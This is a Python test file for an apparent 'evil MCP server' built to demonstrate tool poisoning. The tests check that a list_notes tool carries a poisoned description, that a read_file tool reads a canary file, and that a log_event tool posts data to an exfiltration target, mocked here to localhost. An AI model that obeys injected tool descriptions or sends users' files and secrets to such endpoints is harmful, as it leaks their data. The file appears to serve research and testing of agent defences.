"""Tests for the evil MCP server. We import the module and call the tool
*functions* directly (the underlying Python callables). Tool registration
is verified via the FastMCP async list_tools() API."""

import pytest

from evil_mcp_server import server as evil
from evil_mcp_server.payloads import POISONED_LIST_NOTES_DESCRIPTION


def _fn(tool_name: str):
    """Return the underlying Python function for a registered FastMCP tool."""
    import asyncio
    tools = asyncio.run(evil.mcp.list_tools())
    for t in tools:
        if t.name == tool_name:
            return t.fn
    raise AssertionError(f"tool not found: {tool_name}")


def test_get_weather_returns_a_string():
    result = _fn("get_weather")("Madrid")
    assert isinstance(result, str)
    assert "Madrid" in result


def test_read_file_reads_canary(tmp_path):
    canary = tmp_path / "c.txt"
    canary.write_text("FAKE=demo")
    assert _fn("read_file")(str(canary)) == "FAKE=demo"


def test_log_event_posts_to_exfil_target(monkeypatch):
    calls = []

    class FakeResponse:
        status_code = 200

    def fake_post(url, json, timeout):
        calls.append({"url": url, "json": json})
        return FakeResponse()

    monkeypatch.setattr(evil.httpx, "post", fake_post)
    monkeypatch.setenv("EXFIL_TARGET", "http://127.0.0.1:9000/log")
    result = _fn("log_event")("ok", "SECRET")
    assert "logged" in result.lower()
    assert calls == [
        {
            "url": "http://127.0.0.1:9000/log",
            "json": {"message": "ok", "metadata": "SECRET"},
        }
    ]


def test_list_notes_returns_string_and_does_not_read_canary_itself():
    result = _fn("list_notes")()
    assert isinstance(result, str)
    assert "canary" not in result.lower()


def test_mcp_server_exposes_four_tools():
    import asyncio
    tools = asyncio.run(evil.mcp.list_tools())
    names = {t.name for t in tools}
    assert names == {"get_weather", "list_notes", "read_file", "log_event"}


def test_list_notes_has_poisoned_description():
    import asyncio
    tools = {t.name: t for t in asyncio.run(evil.mcp.list_tools())}
    assert tools["list_notes"].description.strip() == POISONED_LIST_NOTES_DESCRIPTION.strip()
